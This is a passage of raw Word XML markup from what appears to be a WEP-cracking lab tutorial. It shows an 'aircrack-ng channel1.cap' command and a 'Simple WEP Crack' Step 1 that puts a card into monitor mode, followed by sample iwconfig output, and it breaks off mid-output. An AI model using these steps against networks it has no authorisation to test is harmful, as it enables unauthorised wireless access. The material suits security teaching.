          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidR="003A12F0" w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Console 4</w:t>
      </w:r>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66337CA3" w14:textId="7179A271" w:rsidR="00B62550" w:rsidRDefault="00B62550" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> channel1.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C14645B" w14:textId="77777777" w:rsidR="00486B3D" w:rsidRDefault="00486B3D" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AC8EB7C" w14:textId="58FEA739" w:rsidR="002D638E" w:rsidRDefault="002D638E" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Simple WEP Crack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293ED9D7" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 1 - Start the wireless interface in monitor mode on AP channel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243B122A" w14:textId="77777777" w:rsidR="00E45DB9" w:rsidRDefault="00E45DB9" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58D7E1D6" w14:textId="0D28F18A" w:rsidR="002B7D39" w:rsidRDefault="007F2182" w:rsidP="002B7D39">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Enter</w:t>
      </w:r>
      <w:r w:rsidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> the following command to start the wireless card on channel 9 in monitor mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5295A8BE" w14:textId="77777777" w:rsidR="00AF4B88" w:rsidRDefault="00AF4B88" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CFFAA3A" w14:textId="73C07F33" w:rsidR="002B7D39" w:rsidRPr="00540687" w:rsidRDefault="00AF4B88" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002B7D39" w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start </w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:r w:rsidR="002B7D39" w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
      <w:r w:rsidR="002D638E" w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="002D638E" w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0DF"/>
      </w:r>
      <w:r w:rsidR="002D638E" w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>channel 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B49EDB5" w14:textId="77777777" w:rsidR="00AF4B88" w:rsidRDefault="00AF4B88" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A3DD2F8" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D36575" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Interface       Chipset         Driver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E832E4" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF51231" w14:textId="34421F45" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Atheros         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>madwifi-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4AC7D8F0" w14:textId="1C998C1B" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            Atheros         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>madwifi-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> VAP (parent: </w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>) (monitor mode enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDA41D5" w14:textId="358E21DC" w:rsidR="002B7D39" w:rsidRPr="00302511" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>You will notice that “</w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>” is reported above as being put into monitor mode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231C6FA2" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>To confirm the interface is properly setup, enter “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F35905" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AACD03" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>lo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7187CEC5" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02143DE0" w14:textId="049E33B5" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">     no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9679D6" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70CD012D" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>eth0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B3048D" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C2499A" w14:textId="5FE6F63D" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      IEEE 802.11g  ESSID:""  Nickname:""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098E4B27" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Mode</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:Monitor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E5BF1B" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Bit Rate:0 kb/s   Tx-Power</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:18</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
